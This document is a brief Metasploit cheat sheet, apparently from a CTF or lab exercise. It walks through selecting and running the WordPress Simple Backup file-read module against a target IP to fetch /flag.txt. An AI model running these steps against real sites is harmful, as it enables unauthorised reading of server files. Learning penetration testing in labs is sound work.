**Syntax:** `msfconsole [flags]` **Commands:**

# Launch Metasploit silently

msfconsole -q

# Search for a specific plugin or service

search type:exploit name:wordpress search simple backup

# Select a module by index or path

use 33 or use auxiliary/scanner/http/wp_simple_backup_file_read

# View required settings

show options info

# Set target parameters

set RHOSTS 154.57.164.65 set RPORT 30893 set FILEPATH /flag.txt

# Global settings (Applies to all modules in a session)

setg RHOSTS 154.57.164.65

# Execute the module

run exploit

## ⚡ Loot Management

# View all files gathered from targets

loot

# Check status without running full exploit

check

**Flags/Parameters:**

- **-q:** Quiet mode (removes the banner).
    
- **RHOSTS:** Remote Host (Target IP).
    
- **RPORT:** Remote Port (Target Port).
    
- **LHOST:** Local Host (Your IP, usually `tun0`).
    
- **setg:** Sets a variable globally for the entire session.
    
- **DEPTH:** Used in Traversal exploits to define how many levels to go up (e.g., `../../`).